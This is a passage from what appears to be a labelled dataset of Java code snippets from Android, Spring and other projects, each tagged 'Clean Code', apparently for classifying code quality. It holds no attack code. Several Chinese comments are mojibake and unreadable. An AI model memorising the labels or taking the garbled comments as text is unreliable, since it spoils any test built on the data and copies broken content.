  listView.stopScroll();
  avatarContainer2.setPivotY(avatarContainer.getPivotY() + avatarContainer.getMeasuredHeight() / 2f);
  avatarContainer2.setPivotX(avatarContainer2.getMeasuredWidth() / 2f);
  AndroidUtilities.updateViewVisibilityAnimated(avatarContainer2,!expanded,0.95f,true);
  if (Math.min(1f,extraHeight / AndroidUtilities.dp(88f)) > 0.85 && !searchMode && NekoConfig.showIdAndDc.Bool())   idTextView.setVisibility(expanded ? INVISIBLE : VISIBLE);
  callItem.setVisibility(expanded || !callItemVisible ? GONE : INVISIBLE);
  videoCallItem.setVisibility(expanded || !videoCallItemVisible ? GONE : INVISIBLE);
  editItem.setVisibility(expanded || !editItemVisible ? GONE : INVISIBLE);
  otherItem.setVisibility(expanded ? GONE : INVISIBLE);
}",0,Clean Code
"/** 
 * 浠庤姹備腑锛岃幏寰楄璇� Token
 * @param request 璇锋眰
 * @param headerName 璁よ瘉 Token 瀵瑰簲鐨� Header 鍚嶅瓧
 * @param parameterName 璁よ瘉 Token 瀵瑰簲鐨� Parameter 鍚嶅瓧
 * @return 璁よ瘉 Token
 */
public static String obtainAuthorization(HttpServletRequest request,String headerName,String parameterName){
  String token=request.getHeader(headerName);
  if (StrUtil.isEmpty(token)) {
    token=request.getParameter(parameterName);
  }
  if (!StringUtils.hasText(token)) {
    return null;
  }
  int index=token.indexOf(AUTHORIZATION_BEARER + "" "");
  return index >= 0 ? token.substring(index + 7).trim() : token;
}",0,Clean Code
"@Override protected ServerResponse prepareResponse(ServerRequest request,Mono<WebGraphQlResponse> responseMono){
  CompletableFuture<ServerResponse> future=responseMono.map((response) -> {
    MediaType contentType=selectResponseMediaType(request);
    ServerResponse.BodyBuilder builder=ServerResponse.ok();
    builder.headers((headers) -> headers.putAll(response.getResponseHeaders()));
    builder.contentType(contentType);
    Map<String,Object> resultMap=response.toMap();
    ServerResponse.HeadersBuilder.WriteFunction writer=getWriteFunction(resultMap,contentType);
    return (writer != null) ? builder.build(writer) : builder.body(resultMap);
  }
).toFuture();
  if (future.isDone() && !future.isCancelled() && !future.isCompletedExceptionally()) {
    try {
      return future.get();
    }
 catch (    InterruptedException|ExecutionException ignored) {
    }
  }
  return ServerResponse.async(future);
}
",0,Clean Code
"private List<Locale> withoutDuplicateLanguages(List<Locale> locales,String mainLanguage){
  ArrayList<String> languages=new ArrayList<String>(){
{
      add(mainLanguage);
    }
  }
;
  ArrayList<Locale> newLocales=new ArrayList<>();
  for (  Locale locale : locales) {
    boolean keep=true;
    for (    String language : languages) {
      if (locale.getLanguage().equals(language))       keep=false;
    }
    if (!keep)     continue;
    languages.add(locale.getLanguage());
    newLocales.add(locale);
  }
  return newLocales;
}
",0,Clean Code
"/** 
 * Note: if the parameter inputted is empty then will return the empty list.
 * @param serviceName
 * @param clusterName
 * @param ipArray
 * @return
 */
public List<Instance> generateInstancesByIps(String serviceName,String rawProductName,String clusterName,String[] ipArray){
  if (StringUtils.isEmpty(serviceName) || StringUtils.isEmpty(clusterName) || ipArray == null || ipArray.length == 0) {
    return Collections.emptyList();
  }
  List<Instance> instanceList=new ArrayList<>(ipArray.length);
  for (  String ip : ipArray) {
    String[] ipAndPort=generateIpAndPort(ip);
    Instance instance=new Instance();
    instance.setIp(ipAndPort[0]);
    instance.setPort(Integer.valueOf(ipAndPort[1]));
    instance.setClusterName(clusterName);
    instance.setServiceName(serviceName);
    instance.setTenant(Constants.DEFAULT_NAMESPACE_ID);
    instance.setApp(rawProductName);
    instance.setEphemeral(false);
    instanceList.add(instance);
  }
  return instanceList;
}",0,Clean Code
"/** 
 * 杩欎釜鏂规硶涓嶅簲璇ヨ鐩存帴璋冪敤锛屽簲褰撲綔涓哄畾鏃朵换鍔＄殑task锛屽湪姣忓ぉ0鐐规墽琛� 姣忔棩璁块棶閲忓緢澶ф椂锛岃繖涓换鍔″彲鑳藉緢鑰楁椂 <p> 娓呯┖鏄ㄥぉRedis璁垮鏍囪瘑 璁板綍鏄ㄥぉ鐨凱V鍜孶V 鏇存柊鏄ㄥぉ鎵�鏈夎瀹㈢殑PV鍜屾渶鍚庤闂椂闂� 鏇存柊鍩庡競鏂板璁垮UV鏁�
 */
public void syncVisitInfoToDatabase(){
  redisService.deleteCacheByKey(RedisKeyConstants.IDENTIFICATION_SET);
  List<VisitLogUuidTime> yesterdayLogList=visitLogService.getUUIDAndCreateTimeByYesterday();
  Map<String,Integer> PVMap=new HashMap<>(1024);
  Map<String,Date> lastTimeMap=new HashMap<>(1024);
  yesterdayLogList.forEach(log -> {
    String uuid=log.getUuid();
    Date createTime=log.getTime();
    PVMap.merge(uuid,1,Integer::sum);
    lastTimeMap.putIfAbsent(uuid,createTime);
  }
);
  int pv=yesterdayLogList.size();
  int uv=PVMap.size();
  String date=new SimpleDateFormat(""MM-dd"").format(DateUtils.addDays(new Date(),-1));
  visitRecordService.saveVisitRecord(new VisitRecord(pv,uv,date));
  PVMap.forEach((uuid,views) -> {
    VisitLogUuidTime uuidPVTimeDTO=new VisitLogUuidTime(uuid,lastTimeMap.get(uuid),views);
    visitorService.updatePVAndLastTimeByUUID(uuidPVTimeDTO);
  }
);
  List<String> ipSource=visitorService.getNewVisitorIpSourceByYesterday();
  Map<String,Integer> cityVisitorMap=new HashMap<>(512);
  ipSource.forEach(i -> {
    if (i.startsWith(""涓浗"")) {
      String[] split=i.split(""\\|"");
      if (split.length == 4) {
        String city=split[2];
        cityVisitorMap.merge(city,1,Integer::sum);
      }
    }
  }
);
  cityVisitorMap.forEach((k,v) -> cityVisitorService.saveCityVisitor(new CityVisitor(k,v)));
}",0,Clean Code
"private void hideEmojiView(){
  if (!emojiViewVisible && emojiView != null && emojiView.getVisibility() != GONE) {
    emojiView.setVisibility(GONE);
  }
  int wasEmojiPadding=emojiPadding;
  emojiPadding=0;
  if (wasEmojiPadding != emojiPadding) {
    keyboardNotifier.fire();
  }
}",0,Clean Code
"private static void interfaceMethods(String internalName,Set<Map.Entry<String,String>> set,ClassRepo classRepo){
  if (internalName == null || internalName.equals(""java/lang/Object"") || internalName.startsWith(PREFIX))   return;
  ClassNode classNode=classRepo.findClass(internalName);
  if (classNode == null)   return;
  interfaceMethods(classNode.superName,set,classRepo);
  if (classNode.interfaces != null && classNode.interfaces.size() > 0) {
    for (    String intf : classNode.interfaces) {
      interfaceMethods(intf,set,classRepo);
    }
  }
  for (  MethodNode methodNode : classNode.methods) {
    set.add(Maps.immutableEntry(methodNode.name,methodNode.desc));
  }
}",0,Clean Code
"public static void main(String[] args) throws InterruptedException {
  System.out.println(""VM options"");
  System.out.println(ManagementFactory.getRuntimeMXBean().getInputArguments().stream().collect(Collectors.joining(System.lineSeparator())));
  System.out.println(""Program arguments"");
  System.out.println(Arrays.stream(args).collect(Collectors.joining(System.lineSeparator())));
  IntStream.rangeClosed(1,10).mapToObj(i -> new Thread(() -> {
    while (true) {
      String payload=IntStream.rangeClosed(1,10000000).mapToObj(__ -> ""a"").collect(Collectors.joining("""")) + UUID.randomUUID().toString();
      try {
        TimeUnit.SECONDS.sleep(10);
      }
 catch (      InterruptedException e) {
        e.printStackTrace();
      }
      System.out.println(payload.length());
    }
  }
)).forEach(Thread::start);
  TimeUnit.HOURS.sleep(1);
}",0,Clean Code
"private void updateSpoilers2(boolean hasSpoiler){
  if (container == null || imageView == null || imageView.getMeasuredHeight() <= 0 || imageView.getMeasuredWidth() <= 0) {
    return;
  }
  if (hasSpoiler && SpoilerEffect2.supports()) {
    if (spoilerEffect2 == null) {
      spoilerEffect2=SpoilerEffect2.getInstance(container);
    }
  }
 else {
    if (spoilerEffect2 != null) {
      spoilerEffect2.detach(this);
      spoilerEffect2=null;
    }
  }
}",0,Clean Code
"@Override public Animator onDisappear(ViewGroup sceneRoot,View view,TransitionValues startValues,TransitionValues endValues){
  if (startValues == null) {
    return null;
  }
  if (sceneRoot == view) {
    return null;
  }
  int[] position=(int[])startValues.values.get(PROPNAME_SCREEN_POSITION);
  int left=position[0];
  int top=position[1];
  float startX=view.getTranslationX();
  float endX=mSlideCalculator.getGoneX(this,sceneRoot,view,position);
  float startY=view.getTranslationY();
  float endY=mSlideCalculator.getGoneY(this,sceneRoot,view,position);
  final Animator slideAnimator=TranslationAnimationCreator.createAnimation(view,startValues,left,top,startX,startY,endX,endY,sDecelerate,this);
  final Animator fadeAnimator=mFade.onDisappear(sceneRoot,view,startValues,endValues);
  if (slideAnimator == null) {
    return fadeAnimator;
  }
 else   if (fadeAnimator == null) {
    return slideAnimator;
  }
  final AnimatorSet set=new AnimatorSet();
  set.play(slideAnimator).with(fadeAnimator);
  return set;
}",0,Clean Code
"@Override public void updateManifest(DashManifest newManifest,int newPeriodIndex){
  try {
    manifest=newManifest;
    periodIndex=newPeriodIndex;
    long periodDurationUs=manifest.getPeriodDurationUs(periodIndex);
    List<Representation> representations=getRepresentations();
    for (int i=0; i < representationHolders.length; i++) {
      Representation representation=representations.get(trackSelection.getIndexInTrackGroup(i));
      representationHolders[i]=representationHolders[i].copyWithNewRepresentation(periodDurationUs,representation);
    }
  }
 catch (  BehindLiveWindowException e) {
    fatalError=e;
  }
}",0,Clean Code
"@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  if (dy != 0) {
    updateLayout();
    previousScrollOffsetY=scrollOffsetY;
  }
}
@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  if (dy != 0) {
    updateLayout();
    previousScrollOffsetY=scrollOffsetY;
  }
  if (Bulletin.getVisibleBulletin() != null && Bulletin.getVisibleBulletin().getLayout() != null && Bulletin.getVisibleBulletin().getLayout().getParent() instanceof View && ((View)Bulletin.getVisibleBulletin().getLayout().getParent()).getParent() == bulletinContainer2) {
    Bulletin.hideVisible();
  }
}
@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  if (dy != 0) {
    updateLayout();
    previousScrollOffsetY=scrollOffsetY;
  }
}",0,Clean Code
"/** 
 * <p>Finds an accessible method that matches the given name and has compatible parameters. Compatible parameters mean that every method parameter is assignable from  the given parameters. In other words, it finds a method with the given name  that will take the parameters given.<p> <p>This method is used by  {@link #invokeMethod(Object object,String methodName,Object[] args,Class[] parameterTypes)}. <p>This method can match primitive parameter by passing in wrapper classes. For example, a <code>Boolean</code> will match a primitive <code>boolean</code> parameter.
 * @param cls find method in this class
 * @param methodName find method with this name
 * @param parameterTypes find method with most compatible parameters 
 * @return The accessible method
 */
public static Method getMatchingAccessibleMethod(Class<?> cls,String methodName,Class<?>... parameterTypes){
  try {
    Method method=cls.getMethod(methodName,parameterTypes);
    MemberUtils.setAccessibleWorkaround(method);
    return method;
  }
 catch (  NoSuchMethodException e) {
  }
  Method bestMatch=null;
  Method[] methods=cls.getMethods();
  for (  Method method : methods) {
    if (method.getName().equals(methodName) && ClassUtils.isAssignable(parameterTypes,method.getParameterTypes(),true)) {
      Method accessibleMethod=getAccessibleMethod(method);
      if (accessibleMethod != null && (bestMatch == null || MemberUtils.compareParameterTypes(accessibleMethod.getParameterTypes(),bestMatch.getParameterTypes(),parameterTypes) < 0)) {
        bestMatch=accessibleMethod;
      }
    }
  }
  if (bestMatch != null) {
    MemberUtils.setAccessibleWorkaround(bestMatch);
  }
  return bestMatch;
}",0,Clean Code
"@Override public Wallet importWallet(InputStream inputStream,String password) throws ImportException {
  try {
    BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream,StandardCharsets.UTF_8));
    if (password != null) {
      reader=decryptImport(password,reader);
    }
    String header=reader.readLine();
    String descriptor=reader.readLine();
    String paths=reader.readLine();
    String address=reader.readLine();
    OutputDescriptor outputDescriptor=OutputDescriptor.getOutputDescriptor(descriptor);
    return outputDescriptor.toWallet();
  }
 catch (  Exception e) {
    throw new ImportException(""Error importing BSMS format"",e);
  }
}",0,Clean Code
"public void updateTransactions(){
  Map<HashIndex,BlockTransactionHashIndex> walletTxos=getWallet().getWalletTxos().entrySet().stream().collect(Collectors.toUnmodifiableMap(entry -> new HashIndex(entry.getKey().getHash(),entry.getKey().getIndex()),Map.Entry::getKey,BinaryOperator.maxBy(BlockTransactionHashIndex::compareTo)));
  Collection<WalletTransactionsEntry.WalletTransaction> entries=getWalletTransactions(getWallet(),false);
  Set<Entry> current=entries.stream().map(WalletTransaction::getTransactionEntry).collect(Collectors.toCollection(LinkedHashSet::new));
  Set<Entry> previous=new LinkedHashSet<>(getChildren());
  Set<Entry> entriesAdded=Sets.difference(current,previous);
  getChildren().addAll(entriesAdded);
  Set<Entry> entriesRemoved=Sets.difference(previous,current);
  getChildren().removeAll(entriesRemoved);
  calculateBalances(true);
  List<Entry> entriesComplete=entriesAdded.stream().filter(txEntry -> ((TransactionEntry)txEntry).isComplete(walletTxos)).collect(Collectors.toList());
  if (!entriesComplete.isEmpty()) {
    EventManager.get().post(new NewWalletTransactionsEvent(getWallet(),entriesAdded.stream().map(entry -> (TransactionEntry)entry).collect(Collectors.toList())));
  }
  if (entriesAdded.size() > entriesComplete.size()) {
    Set<Entry> incompleteEntries=new HashSet<>(entriesAdded);
    entriesComplete.forEach(incompleteEntries::remove);
    for (    Entry entry : incompleteEntries) {
      TransactionEntry txEntry=(TransactionEntry)entry;
      getChildren().remove(txEntry);
      log.warn(""Removing and not notifying incomplete entry "" + ((TransactionEntry)entry).getBlockTransaction().getHashAsString() + "" value ""+ txEntry.getValue()+ "" children ""+ entry.getChildren().stream().map(e -> e.getEntryType() + "" "" + ((HashIndexEntry)e).getHashIndex()).collect(Collectors.toList()));
    }
  }
}
",0,Clean Code
"public ChildDrawable(Drawable drawable,CompositeDrawable parent){
  this.mDrawable=drawable;
  this.mParent=parent;
  this.mBoundsRule=new BoundsRule();
  drawable.setCallback(parent);
}
ChildDrawable(ChildDrawable orig,CompositeDrawable parent,Resources res){
  final Drawable dr=orig.mDrawable;
  final Drawable clone;
  if (dr != null) {
    final ConstantState cs=dr.getConstantState();
    if (res != null) {
      clone=cs.newDrawable(res);
    }
 else {
      clone=cs.newDrawable();
    }
    clone.setCallback(parent);
    DrawableCompat.setLayoutDirection(clone,DrawableCompat.getLayoutDirection(dr));
    clone.setBounds(dr.getBounds());
    clone.setLevel(dr.getLevel());
  }
 else {
    clone=null;
  }
  if (orig.mBoundsRule != null) {
    this.mBoundsRule=new BoundsRule(orig.mBoundsRule);
  }
 else {
    this.mBoundsRule=new BoundsRule();
  }
  mDrawable=clone;
  mParent=parent;
}
",0,Clean Code
"private void setDualRowStyle(){
  if (rightMargin > 0 || leftMargin > 0 || iconScale != 10 || verticalOffset != 8) {
    MethodHook styleHook=new MethodHook(){
      @Override protected void after(      final MethodHookParam param){
        getDualRowView(param);
      }
    }
;
    if (isMoreHyperOSVersion(1f)) {
      findAndHookMethod(""com.android.systemui.statusbar.StatusBarMobileView"",""fromContext"",Context.class,String.class,styleHook);
    }
 else {
      findAndHookMethod(""com.android.systemui.statusbar.StatusBarMobileView"",""init"",styleHook);
    }
  }
}",0,Clean Code
"/** 
 * Finds the relevant entry for a tileId in a list of entries. <p> If there is an exact match for tileId, return that. Else if the tileId matches an entry's tileId + runLength, return that. Else if the preceding entry is a directory (runLength = 0), return that. Else return null.
 */
public static Pmtiles.Entry findTile(List<Pmtiles.Entry> entries,long tileId){
  int m=0;
  int n=entries.size() - 1;
  while (m <= n) {
    int k=(n + m) >> 1;
    long cmp=tileId - entries.get(k).tileId();
    if (cmp > 0) {
      m=k + 1;
    }
 else     if (cmp < 0) {
      n=k - 1;
    }
 else {
      return entries.get(k);
    }
  }
  if (n >= 0 && (entries.get(n).runLength() == 0 || tileId - entries.get(n).tileId() < entries.get(n).runLength())) {
    return entries.get(n);
  }
  return null;
}",0,Clean Code
"public JSONObject ruleFields(String category,JSONObject node){
  JSONObject retNode=JSONObject.parseObject(JSONObject.toJSONString(node));
  String type=node.getString(Constant.INNER_TYPE);
  JSONArray includeFields=categoryConfigService.getCategoryTypeIncludeFields(category,type);
  JSONArray excludeFields=categoryConfigService.getCategoryTypeExcludeFields(category,type);
  List<String> removeKeys=new ArrayList<>();
  if (!CollectionUtils.isEmpty(includeFields)) {
    for (    String key : retNode.keySet()) {
      if (!includeFields.contains(key)) {
        removeKeys.add(key);
      }
    }
  }
  if (!CollectionUtils.isEmpty(excludeFields)) {
    for (    String key : retNode.keySet()) {
      if (excludeFields.contains(key)) {
        removeKeys.add(key);
      }
    }
  }
  for (  String key : removeKeys) {
    retNode.remove(key);
  }
  return retNode;
}
",0,Clean Code
"public static boolean checkReduceQuantity(List<Integer> sliderValues,Context context,Theme.ResourcesProvider resourcesProvider,List<TLRPC.TL_premiumGiftCodeOption> list,TLRPC.TL_premiumGiftCodeOption selected,Utilities.Callback<TLRPC.TL_premiumGiftCodeOption> onSuccess){
  if (selected.store_product == null) {
    List<TLRPC.TL_premiumGiftCodeOption> result=new ArrayList<>();
    for (    TLRPC.TL_premiumGiftCodeOption item : list) {
      if (item.months == selected.months && item.store_product != null && sliderValues.contains(item.users)) {
        result.add(item);
      }
    }
    TLRPC.TL_premiumGiftCodeOption suggestion=result.get(0);
    for (    TLRPC.TL_premiumGiftCodeOption option : result) {
      if (selected.users > option.users && option.users > suggestion.users) {
        suggestion=option;
      }
    }
    final TLRPC.TL_premiumGiftCodeOption finalSuggestion=suggestion;
    String months=LocaleController.formatPluralString(""GiftMonths"",suggestion.months);
    int current=selected.users;
    int downTo=suggestion.users;
    AlertDialog.Builder builder=new AlertDialog.Builder(context,resourcesProvider);
    builder.setTitle(getString(""BoostingReduceQuantity"",R.string.BoostingReduceQuantity));
    builder.setMessage(replaceTags(formatPluralString(""BoostingReduceQuantityTextPlural"",current,months,downTo)));
    builder.setPositiveButton(getString(""Reduce"",R.string.Reduce),(dialogInterface,i) -> onSuccess.run(finalSuggestion));
    builder.setNegativeButton(getString(""Cancel"",R.string.Cancel),(dialogInterface,i) -> {
    }
);
    builder.show();
    return true;
  }
  return false;
}",0,Clean Code
"@Override public Socket createSocket(){
  return new Socket(proxy);
}
@Override public Socket createSocket(String address,int port) throws IOException {
  return createSocket(createAddress(address,port),null);
}
@Override public Socket createSocket(String address,int port,InetAddress localAddress,int localPort) throws IOException {
  return createSocket(createAddress(address,port),new InetSocketAddress(localAddress,localPort));
}
@Override public Socket createSocket(InetAddress address,int port) throws IOException {
  return createSocket(new InetSocketAddress(address,port),null);
}
@Override public Socket createSocket(InetAddress address,int port,InetAddress localAddress,int localPort) throws IOException {
  return createSocket(new InetSocketAddress(address,port),new InetSocketAddress(localAddress,localPort));
}
private Socket createSocket(InetSocketAddress address,InetSocketAddress bindAddress) throws IOException {
  Socket socket=new Socket(proxy);
  if (bindAddress != null) {
    socket.bind(bindAddress);
  }
  socket.connect(address);
  return socket;
}
",0,Clean Code
"@Override @Transactional public long createEntity(EntityCreateReq req) throws Exception {
  if (!getEntityByName(req.getName()).isEmpty()) {
    throw new EntityExistException(String.format(""鍚屽悕瀹炰綋[%s]宸插瓨鍦�"",req.getName()));
  }
  SwEntity swEntity=buildSwEntity(req);
  entityMapper.insert(swEntity);
  EntityFieldCreateReq fieldCreateReq=new EntityFieldCreateReq();
  fieldCreateReq.setField(DwConstant.PARTITION_FIELD);
  fieldCreateReq.setDim(DwConstant.PARTITION_DIM);
  fieldCreateReq.setType(DwConstant.PARTITION_TYPE);
  fieldCreateReq.setBuildIn(DwConstant.PARTITION_BUILD_IN);
  fieldCreateReq.setAlias(DwConstant.PARTITION_ALIAS);
  fieldCreateReq.setNullable(DwConstant.PARTITION_NULLABLE);
  fieldCreateReq.setDescription(DwConstant.PARTITION_DESCRIPTION);
  SwEntityField swEntityField=buildSwEntityField(swEntity.getId(),fieldCreateReq);
  entityFieldMapper.insert(swEntityField);
  createTableMeta(swEntity.getTableName(),swEntity.getTableAlias(),swEntity.getLifecycle());
  return swEntity.getId();
}
",0,Clean Code
"/** 
 * Returns the stream time in microseconds for a given position.
 * @param position The stream byte-position.
 * @return The stream time in microseconds for the given position.
 */
public long getTimeUsAtPosition(long position){
  return getTimeUsAtPosition(position,firstFrameBytePosition,bitrate);
}
/** 
 * Returns the stream time in microseconds for a given stream position.
 * @param position The stream byte-position.
 * @param firstFrameBytePosition The position of the first frame in the stream.
 * @param bitrate The bitrate (which is assumed to be constant in the stream).
 * @return The stream time in microseconds for the given stream position.
 */
private static long getTimeUsAtPosition(long position,long firstFrameBytePosition,int bitrate){
  return Math.max(0,position - firstFrameBytePosition) * C.BITS_PER_BYTE * C.MICROS_PER_SECOND / bitrate;
}",0,Clean Code
"private void appendColorMarkersSection(AppDialogPresenter settingsPresenter){
  List<OptionItem> options=new ArrayList<>();
  for (  String segmentCategory : mContentBlockData.getAllCategories()) {
    options.add(UiOptionItem.from(getColoredString(mContentBlockData.getLocalizedRes(segmentCategory),mContentBlockData.getColorRes(segmentCategory)),optionItem -> {
      if (optionItem.isSelected()) {
        mContentBlockData.enableColorMarker(segmentCategory);
      }
 else {
        mContentBlockData.disableColorMarker(segmentCategory);
      }
    }
,mContentBlockData.isColorMarkerEnabled(segmentCategory)));
  }
  settingsPresenter.appendCheckedCategory(getContext().getString(R.string.sponsor_color_markers),options);
}
",0,Clean Code
"public void exportScopes(ZipOutputStream os) throws IOException {
  os.putNextEntry(new ZipEntry(""scopes.txt""));
  cachedScope.forEach((scope,modules) -> {
    try {
      os.write((scope.processName + ""/"" + scope.uid+ ""\n"").getBytes(StandardCharsets.UTF_8));
      for (      var module : modules) {
        os.write((""\t"" + module.packageName + ""\n"").getBytes(StandardCharsets.UTF_8));
        for (        var cn : module.file.moduleClassNames) {
          os.write((""\t\t"" + cn + ""\n"").getBytes(StandardCharsets.UTF_8));
        }
        for (        var ln : module.file.moduleLibraryNames) {
          os.write((""\t\t"" + ln + ""\n"").getBytes(StandardCharsets.UTF_8));
        }
      }
    }
 catch (    IOException e) {
      Log.w(TAG,scope.processName,e);
    }
  }
);
  os.closeEntry();
}",0,Clean Code
"@Override public boolean onItemClick(EasyRecyclerView parent,View view,int position,long id){
  Context context=getEHContext();
  if (null != context && null != mHelper && null != mGalleryInfo) {
    GalleryPreview p=mHelper.getDataAtEx(position);
    if (p != null) {
      try {
        Intent intent=new Intent(context,GalleryActivity.class);
        intent.setAction(GalleryActivity.ACTION_EH);
        intent.putExtra(GalleryActivity.DATA_IN_EVENT,true);
        startActivity(intent);
        EventBus.getDefault().postSticky(new GalleryActivityEvent(p.getPosition(),mGalleryInfo));
      }
 catch (      RuntimeException e) {
        FirebaseCrashlytics.getInstance().recordException(e);
      }
    }
  }
  return true;
}
",0,Clean Code
"@Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpParam) throws Throwable {
  if (!lpParam.packageName.equals(listenPackage))   return;
  Class<?> ClipboardOverlayControllerClass=findClass(""com.android.systemui.clipboardoverlay.ClipboardOverlayController"",lpParam.classLoader);
  ReflectionTools.hookAllMethodsMatchPattern(ClipboardOverlayControllerClass,""setExpandedView.*"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param) throws Throwable {
      if (EnableClipboardSmartActions) {
        setObjectField(getObjectField(param.thisObject,""mClipboardModel""),""isRemote"",true);
      }
    }
  }
);
  hookAllMethods(findClass(""com.android.settingslib.mobile.MobileMappings$Config"",lpParam.classLoader),""readConfig"",new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      if (SBLTEIcon == SIGNAL_DEFAULT)       return;
      setObjectField(param.getResult(),""show4gForLte"",SBLTEIcon == SIGNAL_FORCE_4G);
    }
  }
);
}",0,Clean Code
"@Override public void onReceive(Context context,Intent intent){
  ApplicationLoader.postInitApplication();
  Bundle remoteInput=RemoteInput.getResultsFromIntent(intent);
  if (remoteInput == null) {
    return;
  }
  CharSequence text=remoteInput.getCharSequence(NotificationsController.EXTRA_VOICE_REPLY);
  if (TextUtils.isEmpty(text)) {
    return;
  }
  long dialogId=intent.getLongExtra(""dialog_id"",0);
  int maxId=intent.getIntExtra(""max_id"",0);
  long topicId=intent.getLongExtra(""topic_id"",0);
  int currentAccount=intent.getIntExtra(""currentAccount"",0);
  if (dialogId == 0 || maxId == 0 || !UserConfig.isValidAccount(currentAccount)) {
    return;
  }
  AccountInstance accountInstance=AccountInstance.getInstance(currentAccount);
  if (DialogObject.isUserDialog(dialogId)) {
    TLRPC.User user=accountInstance.getMessagesController().getUser(dialogId);
    if (user == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.User user1=accountInstance.getMessagesStorage().getUserSync(dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putUser(user1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
 else   if (DialogObject.isChatDialog(dialogId)) {
    TLRPC.Chat chat=accountInstance.getMessagesController().getChat(-dialogId);
    if (chat == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.Chat chat1=accountInstance.getMessagesStorage().getChatSync(-dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putChat(chat1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
  sendMessage(accountInstance,text,dialogId,topicId,maxId);
}",0,Clean Code
"@Override public List<CrmStatisticsFollowUpSummaryByDateRespVO> getFollowUpSummaryByDate(CrmStatisticsCustomerReqVO reqVO){
  reqVO.setUserIds(getUserIds(reqVO));
  if (CollUtil.isEmpty(reqVO.getUserIds())) {
    return Collections.emptyList();
  }
  List<CrmStatisticsFollowUpSummaryByDateRespVO> followUpRecordCountList=customerMapper.selectFollowUpRecordCountGroupByDate(reqVO);
  List<CrmStatisticsFollowUpSummaryByDateRespVO> followUpCustomerCountList=customerMapper.selectFollowUpCustomerCountGroupByDate(reqVO);
  List<LocalDateTime[]> timeRanges=LocalDateTimeUtils.getDateRangeList(reqVO.getTimes()[0],reqVO.getTimes()[1],reqVO.getInterval());
  return convertList(timeRanges,times -> {
    Integer followUpRecordCount=followUpRecordCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsFollowUpSummaryByDateRespVO::getFollowUpRecordCount).sum();
    Integer followUpCustomerCount=followUpCustomerCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsFollowUpSummaryByDateRespVO::getFollowUpCustomerCount).sum();
    return new CrmStatisticsFollowUpSummaryByDateRespVO().setTime(LocalDateTimeUtils.formatDateRange(times[0],times[1],reqVO.getInterval())).setFollowUpCustomerCount(followUpRecordCount).setFollowUpRecordCount(followUpCustomerCount);
  }
);
}",0,Clean Code
"@Override public boolean removeInput(Input input){
  if (!containsInput(input) || input == null || !input.unload()) {
    return false;
  }
 else {
    ArrayList<Input> tmp=new ArrayList<>();
    for (    Input i : inputs) {
      if (input != i) {
        tmp.add(i);
      }
    }
    inputs=tmp;
    return true;
  }
}
",0,Clean Code
"private static String normalizeNewLines(String text,boolean useCrlf){
  if (!text.contains(""\n"")) {
    return text;
  }
  StringBuilder normalized=new StringBuilder();
  for (int i=0; i < text.length(); i++) {
    char c=text.charAt(i);
    if (useCrlf && c == '\n' && (i == 0 || text.charAt(i - 1) != '\r')) {
      normalized.append('\r').append('\n');
    }
 else     if (useCrlf || c != '\r') {
      normalized.append(c);
    }
  }
  return normalized.toString();
}",0,Clean Code
"@Subscriber(value=@Param(type=UIOperationMessage.class,sticky=false),thread=RunningThread.MAIN_THREAD) public void receiveDeviceInfoMessage(UIOperationMessage message){
  if (message.eventType == UIOperationMessage.TYPE_DEVICE_INFO) {
    DeviceInfo info=DeviceInfoUtil.generateDeviceInfo();
    showDialog(StringUtil.getString(R.string.ui__device_info),info.toString(),binder.loadServiceContext(),0);
  }
 else   if (message.eventType == UIOperationMessage.TYPE_DIALOG) {
    String info=message.getParam(""msg"");
    String title=message.getParam(""title"");
    showDialog(title,info,binder.loadServiceContext(),0);
  }
 else   if (message.eventType == UIOperationMessage.TYPE_COUNT_DOWN) {
    long timeMillis=message.getParam(""time"");
    showDialog(StringUtil.getString(R.string.ui__sleep),StringUtil.getString(R.string.ui__sleep_time,timeMillis),binder.loadServiceContext(),timeMillis);
  }
 else   if (message.eventType == UIOperationMessage.TYPE_DISMISS) {
    if (dialogRef != null && dialogRef.get() != null && dialogRef.get().isShowing()) {
      dialogRef.get().dismiss();
    }
  }
}",0,Clean Code
"@Override public int getCurrentItemTop(){
  if (listView.getChildCount() <= 0) {
    listView.setTopGlowOffset(listView.getPaddingTop());
    return Integer.MAX_VALUE;
  }
  View child=listView.getChildAt(0);
  RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findContainingViewHolder(child);
  int top=child.getTop();
  int newOffset=AndroidUtilities.dp(8);
  if (top >= AndroidUtilities.dp(8) && holder != null && holder.getAdapterPosition() == 0) {
    newOffset=top;
  }
  listView.setTopGlowOffset(newOffset);
  return newOffset;
}",0,Clean Code
"@Override public void scrollToPosition(int position){
  mPositionBeforeScroll=getCurrentPosition();
  mSmoothScrollTargetPosition=position;
  super.scrollToPosition(position);
  if (mSmoothScrollTargetPosition >= 0 && mSmoothScrollTargetPosition < getItemCount() && mSmoothScrollTargetPosition != mPositionBeforeScroll && mOnPageChangedListener != null) {
    getViewTreeObserver().addOnGlobalLayoutListener(mGlobalLayoutListener);
  }
}",0,Clean Code
"private static void analysisDeviceScreenInfo(Device device,String screenInfo){
  if (screenInfo == null || device == null) {
    return;
  }
  Log.d(""鑾峰彇鍒扮殑灏哄淇℃伅 "" + screenInfo.trim());
  final int physicalSizeStartIndex=screenInfo.indexOf(PHYSICAL_SIZE);
  Pattern numberPattern=Pattern.compile(""[0-9]+"");
  if (physicalSizeStartIndex > -1) {
